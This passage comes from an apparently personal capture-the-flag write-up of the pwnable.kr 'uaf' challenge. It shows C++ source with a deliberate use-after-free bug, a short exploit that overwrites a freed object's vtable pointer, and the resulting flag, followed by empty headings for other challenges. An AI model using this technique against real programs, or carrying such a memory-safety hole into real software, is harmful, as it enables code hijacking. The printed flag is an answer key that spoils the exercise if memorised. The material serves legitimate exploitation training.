                <span class="n">cout</span> <span class="o">&lt;</span> <span class="s">"I am a cute girl!"</span> <span class="o">&lt;</span> <span class="n">endl</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">};</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
        <span class="n">Human</span><span class="o">*</span> <span class="n">m</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Man</span><span class="p">(</span><span class="s">"Jack"</span><span class="p">,</span> <span class="mi">25</span><span class="p">);</span>
        <span class="n">Human</span><span class="o">*</span> <span class="n">w</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Woman</span><span class="p">(</span><span class="s">"Jill"</span><span class="p">,</span> <span class="mi">21</span><span class="p">);</span>

        <span class="kt">size_t</span> <span class="n">len</span><span class="p">;</span>
        <span class="kt">char</span><span class="o">*</span> <span class="n">data</span><span class="p">;</span>
        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">op</span><span class="p">;</span>
        <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">){</span>
                <span class="n">cout</span> <span class="o">&lt;</span> <span class="s">"1. use</span><span class="se">\n</span><span class="s">2. after</span><span class="se">\n</span><span class="s">3. free</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
                <span class="n">cin</span> <span class="o">&gt;</span> <span class="n">op</span><span class="p">;</span>

                <span class="k">switch</span><span class="p">(</span><span class="n">op</span><span class="p">){</span>
                        <span class="k">case</span> <span class="mi">1</span><span class="p">:</span>
                                <span class="n">m</span><span class="o">-&gt;</span><span class="n">introduce</span><span class="p">();</span>
                                <span class="n">w</span><span class="o">-&gt;</span><span class="n">introduce</span><span class="p">();</span>
                                <span class="k">break</span><span class="p">;</span>
                        <span class="k">case</span> <span class="mi">2</span><span class="p">:</span>
                                <span class="n">len</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
                                <span class="n">data</span> <span class="o">=</span> <span class="n">new</span> <span class="kt">char</span><span class="p">[</span><span class="n">len</span><span class="p">];</span>
                                <span class="n">read</span><span class="p">(</span><span class="n">open</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">O_RDONLY</span><span class="p">),</span> <span class="n">data</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
                                <span class="n">cout</span> <span class="o">&lt;</span> <span class="s">"your data is allocated"</span> <span class="o">&lt;</span> <span class="n">endl</span><span class="p">;</span>
                                <span class="k">break</span><span class="p">;</span>
                        <span class="k">case</span> <span class="mi">3</span><span class="p">:</span>
                                <span class="n">delete</span> <span class="n">m</span><span class="p">;</span>
                                <span class="n">delete</span> <span class="n">w</span><span class="p">;</span>
                                <span class="k">break</span><span class="p">;</span>
                        <span class="nl">default:</span>
                                <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s1">'print ("\x68\x15\x40\x00\x00\x00\x00\x00")'</span> <span class="o">&gt;</span> /tmp/ihcuaf

./uaf 24 /tmp/ihcuaf

3 2 2 1

<span class="nb">cat </span>flag
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">yay_f1ag_aft3r_pwning</code></p>

<p>https://gist.github.com/ihciah/3c157f18f49bd2287470</p>

<p>https://medium.com/@c0ngwang/pwnable-kr-writeup-uaf-4cb8ba851472</p>

<h1 id="memcpy"><a href="#header-1"></a>memcpy</h1>
<h1 id="asm"><a href="#header-1"></a>asm</h1>
<h1 id="unlink"><a href="#header-1"></a>unlink</h1>
<h1 id="blukat"><a href="#header-1"></a>blukat</h1>
<h1 id="horcruxes"><a href="#header-1"></a>horcruxes</h1>
<h1><a href="#header-1"></a></h1>
<h1 id="-1"><a href="#header-1"></a></h1>
<h1 id="-2"><a href="#header-1"></a></h1>
<h1 id="-3"><a href="#header-1"></a></h1>
<h1 id="-4"><a href="#header-1"></a></h1>
<h1 id="-5"><a href="#header-1"></a></h1>
<h1 id="-6"><a href="#header-1"></a></h1>
<h1 id="-7"><a href="#header-1"></a></h1>
<h1 id="-8"><a href="#header-1"></a></h1>
<h1 id="-9"><a href="#header-1"></a></h1>
<h1 id="-10"><a href="#header-1"></a></h1>
<h1 id="-11"><a href="#header-1"></a></h1>
<h1 id="-12"><a href="#header-1"></a></h1>
<h1 id="-13"><a href="#header-1"></a></h1>
<h1 id="-14"><a href="#header-1"></a></h1>
<h1 id="-15"><a href="#header-1"></a></h1>
<h1 id="-16"><a href="#header-1"></a></h1>
<h1 id="-17"><a href="#header-1"></a></h1>
<h1 id="-18"><a href="#header-1"></a></h1>
<h1 id="-19"><a href="#header-1"></a></h1>
<h1 id="-20"><a href="#header-1"></a></h1>
<h1 id="-21"><a href="#header-1"></a></h1>
<h1 id="-22"><a href="#header-1"></a></h1>
<h1 id="-23"><a href="#header-1"></a></h1>
<h1 id="-24"><a href="#header-1"></a></h1>
<h1 id="-25"><a href="#header-1"></a></h1>
<h1 id="-26"><a href="#header-1"></a></h1>
<h1 id="-27"><a href="#header-1"></a></h1>
<h1 id="-28"><a href="#header-1"></a></h1>
<h1 id="-29"><a href="#header-1"></a></h1>
<h1 id="-30"><a href="#header-1"></a></h1>
<h1 id="-31"><a href="#header-1"></a></h1>
<h1 id="-32"><a href="#header-1"></a></h1>
<h1 id="-33"><a href="#header-1"></a></h1>
<h1 id="-34"><a href="#header-1"></a></h1>
<h1 id="-35"><a href="#header-1"></a></h1>
<h1 id="-36"><a href="#header-1"></a></h1>
<h1 id="-37"><a href="#header-1"></a></h1>
<h1 id="-38"><a href="#header-1"></a></h1>
<h1 id="-39"><a href="#header-1"></a></h1>

</article>
      </section>
    </div>
  </div>
</body>

</html>
